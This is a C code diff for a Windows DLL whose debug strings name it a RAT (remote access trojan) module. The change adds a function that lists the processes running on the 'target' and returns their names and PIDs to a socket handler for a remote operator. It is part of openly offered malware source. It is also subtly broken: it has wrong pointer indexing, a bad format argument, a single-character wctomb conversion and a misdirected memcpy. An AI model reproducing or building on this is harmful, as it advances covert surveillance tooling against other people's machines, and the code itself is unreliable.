@@ -16,7 +16,8 @@ INT handleProcessList(SOCKET clientSock)
 {
 	 INT status = SUCCESS, numProcesses = 0;
 	 CHAR msgBuf[DEFAULT_BUF_LEN];
-	 CHAR* processNames = NULL, * processPIDs = NULL;
+	 CHAR** processNames = NULL;
+	 DWORD* processPIDs = NULL;
 
 	 // Grab a list of process names and their PIDs
 	 status = doProcessList(&processNames, &processPIDs, &numProcesses);
@@ -39,11 +40,12 @@ cleanup:
 }
 
 
-INT doProcessList(__out CHAR** processNames, __out CHAR** processPIDs, __out INT* numProcesses)
+INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out INT* numProcesses)
 {
 	INT status = SUCCESS;
 	DWORD *aProcesses = NULL, cbNeeded = 0, cProcesses = 0;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
+	TCHAR szProcessName[MAX_PATH];
 	UINT64 i;
 
 	// We expect this to fail so we can precisely grab the proper number of processes running on target 
@@ -80,7 +82,76 @@ INT doProcessList(__out CHAR** processNames, __out CHAR** processPIDs, __out INT
 
 	*numProcesses = cProcesses;
 
+	sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Found %d processes\n", cProcesses);
+	OutputDebugStringA(msgBuf);
 
+	// Get each process name and ID
+	*processNames = (CHAR**)malloc(cProcesses * sizeof(CHAR*));
+	if (*processNames == NULL)
+	{
+		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+	*processPIDs = (DWORD*)malloc(cProcesses * sizeof(DWORD));
+	if (*processPIDs == NULL)
+	{
+		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+	for (i = 0; i < cProcesses; i++)
+	{
+		if (aProcesses[i] != 0)
+		{
+			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
+
+			if (hProcess != NULL)
+			{
+				HMODULE hMod;
+				DWORD cbNeeded;
+
+				// Get process name
+				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
+				{
+					GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
+
+					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s with PID %d\n", szProcessName[i], aProcesses[i]);
+					OutputDebugStringA(msgBuf);
+
+					// Copy over this base name
+					*processNames[i] = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(TCHAR));
+					if (*processNames[i] == NULL)
+					{
+						OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
+						status = FAILURE;
+						goto cleanup;
+					}
+
+					if (!wctomb(*processNames[i], *szProcessName))
+					{
+						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from wctomb %d\n", status);
+						OutputDebugStringA(msgBuf);
+						status = FAILURE;
+						goto cleanup;
+					}
+
+					// We already have the PID so copy that as well
+					if (!memcpy(processPIDs[i], &aProcesses[i], sizeof(DWORD)))
+					{
+						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
+						OutputDebugStringA(msgBuf);
+						status = FAILURE;
+						goto cleanup;
+					}
+				}
+
+				CloseHandle(hProcess);
+			}
+		}
+	}
 
 
 
